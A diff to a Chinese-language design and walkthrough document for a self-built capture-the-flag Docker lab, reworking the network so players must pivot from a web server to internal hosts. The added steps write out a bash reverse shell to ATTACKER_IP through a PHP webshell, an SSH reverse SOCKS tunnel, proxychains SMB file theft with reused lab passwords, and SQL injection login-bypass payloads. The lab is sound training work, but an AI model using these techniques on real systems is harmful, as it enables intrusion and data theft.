@@ -23,7 +23,7 @@
      ▼
 ┌─── DMZ 172.20.1.0/24 ─────────────────────────────┐
 │  frontier  172.20.1.10   host:8080(http) 8025(webmail) │
-│  relay     172.20.1.12   host:2222(ssh)  dual-homed ───┼──┐
+│  relay     172.20.1.12   無 host port，dual-homed ─────┼──┐
 └─────────────────────────────────────────────────────┘  │
                                                            │
 ┌─── Internal 10.10.0.0/24（internal: true，不對外）───────┘
@@ -33,6 +33,7 @@
 ```
 
 - 三台 host 各自是一個 container，內部用 supervisord 跑多個 process（原本 VulnCastle 是 7 台獨立 container）。
+- 只有 `frontier` 對外映射 port（`8080`/`8025`）。`relay` 跟 `archive` 都完全不映射 port 到宿主機 — 從攻擊機的角度，`nmap -p- TARGET` 只看得到 frontier 這兩個 port，relay 跟 archive 都必須先在 frontier 拿到執行權限，再從 container 內部直連對方的 IP 才碰得到（兩者都在 dmz bridge network 上，container 間互通不需要額外的 port mapping）。這是這一輪修正的重點：原本 relay 的 SSH（`2222:22`）直接映射到宿主機，導致第一次全端口掃描就會看到 relay 的服務，破壞「先攻破 DMZ，才發現內部還有一台」的真實感；現在跟 `archive` 的做法一致，逼玩家真的走一次 pivot。
 - `archive` 完全不映射 port 到宿主機，只能從 `relay` 所在的 internal network 抵達 — 必須真的建立 pivot。
 - 部署指令：`./start.sh`，或手動 `docker build -t black-archive-base:latest ./lab/base/ && docker compose up -d --build`。
 - 本文件裡的指令都是在「攻擊機跟受害機是同一台」或「用 docker host 的 LAN IP」兩種情境下都能用，把 `TARGET` 換成你打靶時實際用的 IP 即可（這次部署測試時是 `192.168.3.134` / `192.168.52.135`，視你的網卡而定）。
@@ -58,10 +59,12 @@
 ### 2.1 Recon
 ```bash
 nmap -sC -sV -p- TARGET
-# TARGET 是 docker host 的 IP，frontier/relay 的 host port 都映射在同一個 IP 上，
+# TARGET 是 docker host 的 IP。只有 frontier 對外映射 port：
 # 預期：8080/tcp http (nginx，容器內部是 80，host 映射成 8080)、
-#      8025/tcp http (Python BaseHTTPServer, webmail)、
-#      2222/tcp ssh (RELAY，同一台 host 上映射出來的，不是 frontier 自己的服務)
+#      8025/tcp http (Python BaseHTTPServer, webmail)
+# relay 跟 archive 都沒有映射任何 host port，這次掃描完全看不到它們 —
+# 這正是重點：從攻擊機的視角，一開始只有一台 server、兩個 port，
+# 「這裡還有別的host」是要靠攻破 frontier 之後才會發現的事，不是掃描就送出來的。
 ```
 逛 `http://TARGET:8080/`，導覽列有 Home / Dependent Status Index / Case File Intake / Network Diagnostics / Support Tickets。
 
@@ -132,21 +135,33 @@ webmail 的登入帳號 `sysadmin` 剛好也是 base image 的真實 OS 帳號 �
 
 ---
 
-## 3. ACT II — RELAY（dmz: 172.20.1.12 / internal: 10.10.0.12, host:2222）
+## 3. ACT II — RELAY（dmz: 172.20.1.12 / internal: 10.10.0.12，無 host port）
 
 ### 設計意圖
-玩家第一次意識到「這不只是資料錯誤，是被刻意搬走的資料」。ONI Section III / Cmdr. Petrov 第一次出現。
+玩家第一次意識到「這不只是資料錯誤，是被刻意搬走的資料」。ONI Section III / Cmdr. Petrov 第一次出現。同時這裡也是「先攻破 frontier 才能碰到 relay」這個 pivot 動作真正發生的地方——relay 完全不對外開 port，SSH 只能從已經在 dmz 網段裡的機器（也就是 frontier）連進去。
 
-### 3.1 憑證重用登入
+### 3.1 從 FRONTIER 取得的立足點做 pivot
+先在 2.3 節任一條路拿到 frontier 上 `www-data` 的執行權限，但那是靠 URL 參數執行單一指令的 webshell，沒有真正的互動式終端機，直接打 `ssh` 會卡在密碼互動提示上。要先把它升級成一個真正的互動式 shell：
 ```bash
-ssh -p 2222 sysadmin@TARGET
+# 1. 從 webshell 開一個 bash reverse shell 回自己的 nc listener
+nc -lvnp 4444        # 攻擊機這邊先聽
+curl "http://TARGET:8080/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
+
+# 2. reverse shell 接到之後升級成真正的 TTY（frontier 的 base image 有 python3）
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl-Z 回攻擊機，再：
+stty raw -echo; fg
+export TERM=xterm
+
+# 3. 現在有真正的互動式終端機了，直接 ssh 進 relay（dmz 網段內互通，不用任何 port 映射）
+ssh sysadmin@172.20.1.12        # 或 ssh sysadmin@relay.internal
 # 密碼：admin123（跟 webmail 同一組）
 ```
-relay 是 dual-homed：DMZ 側 `172.20.1.12`、Internal 側 `10.10.0.12`。SSH 進去之後，這台機器本身也在 172.20.1.0/24 上，如果你已經從 FRONTIER 拿到 shell，其實可以不透過 SSH，直接從 frontier 的 container 對 dmz 網段做內部掃描，直連 relay 的 `3000`（API）、`3306`（MariaDB）——因為 dmz 是普通 bridge network，同網段互通，這是刻意保留的「已經在內網就能少走一步」彈性，不是必經路徑。
+relay 是 dual-homed：DMZ 側 `172.20.1.12`、Internal 側 `10.10.0.12`。SSH 進去之後，這台機器本身也在 172.20.1.0/24 上，如果你不想每次都真的 SSH 進去，其實可以直接從 frontier 的 container 對 relay 的 dmz IP 做內部掃描，直連 relay 的 `3000`（API）、`3306`（MariaDB）——因為 dmz 是普通 bridge network，同網段互通，這是刻意保留的「已經在內網就能少走一步」彈性，不是必經路徑；但要讀 relay 本機檔案系統（`/etc/ledger/sync.conf`，見 3.3b）還是需要真正的 shell。
 
-### 3.2 LEDGER API（3000，只在 internal-facing，不對 host 開 port）
+### 3.2 LEDGER API（relay 的 3000 port，只在 internal-facing，不對 host 開 port）
 ```bash
-curl http://127.0.0.1:3000/                       # 列出全部 endpoint
+curl http://127.0.0.1:3000/                       # 列出全部 endpoint（在 relay 本機執行；從 frontier 直連則用 172.20.1.12:3000）
 curl http://127.0.0.1:3000/api/cases               # 列出全部案件（IDOR：無授權檢查）
 curl http://127.0.0.1:3000/api/cases/1              # Eli Okafor — 帶 transfer_ref: SPINDLE-7-0119
 curl http://127.0.0.1:3000/api/cases/5              # 不是案件，是系統帳號：ledger-cairn-sync
@@ -224,16 +239,24 @@ sync_pass = Records!Access99
 真相的核心層。SPARTAN-II 名稱、flash-clone、augmentation、Halsey 書信片段都在這裡——這是一個重大世界觀 reveal，**但不是遊戲的最終答案**。玩家必須自己從好幾份不同來源拼出全貌，沒有單一「THE_TRUTH.txt」，而且拼出 SPARTAN-II 之後應該立刻意識到：這仍然沒有回答 LONGSHORE 開場真正問的問題——誰在 2547 年重新碰過 Farrow 的案件、為什麼。
 
 ### 4.1 Pivot 進入（從 relay 內部）
-archive 沒有映射任何 port 到宿主機，只能：
+archive 沒有映射任何 port 到宿主機，而且跟 relay 不一樣，archive **只在 internal network 上**——frontier 完全碰不到它，只有 relay 是 dual-homed、真正橋接兩邊。但 relay 本身沒裝 `smbclient`，SMB/HTTP 這些操作還是得用攻擊機自己裝好的工具，所以這裡真正需要的不是單純轉發，是把攻擊機自己接進 internal network：在已經拿到的 relay shell（3.1 節，frontier pivot 進來的）裡，開一個反向 dynamic SOCKS 轉發，回打到攻擊機自己的 sshd：
 ```bash
-# 從已經拿到的 relay shell 內部直接打，或
-ssh -p 2222 sysadmin@TARGET -L 8080:cairn.internal:8080 -L 445:cairn.internal:445
+# relay 本身有到攻擊機的正常出站路由（跟 frontier reverse shell 那條路一樣，
+# 都是 docker bridge 的一般 NAT 出站，不需要額外開洞），
+# 所以可以直接從 relay 的 shell 反向連回攻擊機：
+ssh -R 1080 <攻擊機自己的帳號>@ATTACKER_IP -N
+# 攻擊機這邊要先確保自己有在跑 sshd，帳密用攻擊機自己的即可
 ```
-（或用 relay 的 socat/SUID python3 建立自己的 SOCKS/轉發，這是保留給玩家自己選工具的部分，`ssh -L` 只是最簡單的示範。）
+這樣攻擊機本機的 `127.0.0.1:1080` 就是一個 SOCKS 代理，背後走的是 relay 的網路視角（含 relay 能直連的 internal 網段）。接下來攻擊機自己的工具都透過 `proxychains4`（設定檔指向 `socks5 127.0.0.1 1080`）打：
+```bash
+proxychains4 smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1
+proxychains4 curl http://cairn.internal:8080/
+```
+（也可以用 relay 上的 socat 自己搭別的轉發方式，這是保留給玩家自己選工具的部分——重點是 archive 完全隔離在 internal network，任何方法都得先真正落地在 relay 的執行環境裡才能出得去。）
 
 ### 4.2 SMB（445，reuse `sysadmin/admin123`）
 ```bash
-smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1
+proxychains4 smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1
 # public / confidential / backups
 ```
 
@@ -243,7 +266,7 @@ smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1
 
 **`confidential`**（限定 `valid users = sysadmin`）：
 ```bash
-smbclient //cairn.internal/confidential -U sysadmin%admin123 -m NT1 \
+proxychains4 smbclient //cairn.internal/confidential -U sysadmin%admin123 -m NT1 \
   -c "get acquisition_directive_excerpt.txt; get acquisition_directive_scan.pdf; get disposition_order_2547-014.pdf; get legacy_service_credentials.txt; get cairn_backup_key; \
       get cairn_access_log_extract.txt; get petrov_i_performance_review_2518.txt"
 ```
@@ -259,13 +282,13 @@ smbclient //cairn.internal/confidential -U sysadmin%admin123 -m NT1 \
 這台的 sshd 被獨立加固過：`PasswordAuthentication no`，`sysadmin/admin123` 對 SSH **完全無效**（Samba 不受影響，繼續吃這組密碼）——這是刻意設計，逼玩家不能單純密碼重用就跳過整個 Act III 直接拿 shell 提權。真正能登入的是上面 SMB confidential share 裡那把 `cairn_backup_key`：
 ```bash
 chmod 600 cairn_backup_key
-ssh -i cairn_backup_key -J sysadmin@TARGET:2222 sysadmin@cairn.internal
+proxychains4 ssh -i cairn_backup_key sysadmin@cairn.internal
 ```
-（`-J` 走 relay 當 jump host，因為 archive 沒有映射 port 到宿主機；也可以先用 4.1 的 `-L` 手動轉發再對 `127.0.0.1` 打。）拿到這個 shell 之後才能做 4.6 的本機提權——`sudo -l`、`id`、`/etc/crontab` 這些 enumeration 都要在這個 shell 裡做，不是在 relay 的 shell 裡。
+（走 4.1 節已經建立好的那條反向 SOCKS 隧道——`cairn_backup_key` 本身就是從那條隧道下載下來的，同一條路直接拿來 ssh 即可，不需要另外開一個 jump host；也可以把這把 key 傳進 relay 的 shell，直接從那裡 `ssh -i cairn_backup_key sysadmin@cairn.internal`，因為 relay 本身就有到 archive 的直接路由。）拿到這個 shell 之後才能做 4.6 的本機提權——`sudo -l`、`id`、`/etc/crontab` 這些 enumeration 都要在這個 shell 裡做，不是在 relay 的 shell 裡。
 
 **`backups`**（guest 可讀寫，操作失誤留下的東西）：
 ```bash
-smbclient //cairn.internal/backups -U sysadmin%admin123 -m NT1 \
+proxychains4 smbclient //cairn.internal/backups -U sysadmin%admin123 -m NT1 \
   -c "get casualty_log_partial.txt; get training_roster_fragment.txt; get old_budget_q3_2546.txt; \
       get dependent_notification_fragment.txt; get n.okafor_badge_photo.jpg; \
       get kade_m_separation_summary.txt; get castel_m_leave_record_2517.txt; get foia_review_2553.txt"
@@ -282,12 +305,12 @@ smbclient //cairn.internal/backups -U sysadmin%admin123 -m NT1 \
 
 直接把經典 payload 貼在 `username` 欄位已經不再有效：
 ```bash
-curl -i -X POST http://cairn.internal:8080/login --data "username=administrator' -- &password=x"
+proxychains4 curl -i -X POST http://cairn.internal:8080/login --data "username=administrator' -- &password=x"
 # 這次不會 302 -> /dashboard 了
 ```
 原因：這台之前收過一份 pentest finding（SEC-2211），修法是把 `username` 欄位的單引號跟 `--` 直接 strip 掉——`admin_panel.py` 裡 `username = username.replace("'", "").replace("--", "")`。這個修法只針對 finding 報告裡點名的欄位，同一條 f-string 組出來的查詢在 `password` 欄位完全沒有動過。玩家需要實際用 Burp Repeater（或手動改 curl）測試把 injection 換到 `password` 欄位，才會發現同一個弱點還在：
 ```bash
-curl -i -c cairn_cookies.txt -X POST http://cairn.internal:8080/login --data "username=administrator&password=x' OR '1'='1"
+proxychains4 curl -i -c cairn_cookies.txt -X POST http://cairn.internal:8080/login --data "username=administrator&password=x' OR '1'='1"
 # 302 -> /dashboard，回應帶 Set-Cookie: cairn_session=<token>
 ```
 （原理：`SELECT * FROM admins WHERE username='administrator' AND password='x' OR '1'='1'`，`AND` 比 `OR` 先算，右邊的 `'1'='1'` 恆真，整個 WHERE 恆真，回傳第一筆。）
@@ -296,7 +319,7 @@ curl -i -c cairn_cookies.txt -X POST http://cairn.internal:8080/login --data "us
 
 **`/dashboard`、`/records/*` 現在有真的 session 檢查**（`admin_panel.py` 的 `VALID_SESSIONS`/`has_valid_session`），沒帶登入時拿到的 `cairn_session` cookie 一律 302 回首頁——**一定要用 `-b` 帶上面 `-c` 存下來的 cookie**，不能像沒有這個檢查時那樣直接裸 curl：
 ```bash
-curl -b cairn_cookies.txt http://cairn.internal:8080/dashboard
+proxychains4 curl -b cairn_cookies.txt http://cairn.internal:8080/dashboard
 # 列出 [101]~[106] 六份文件
 ```
 | # | 標題 | 內容重點 |
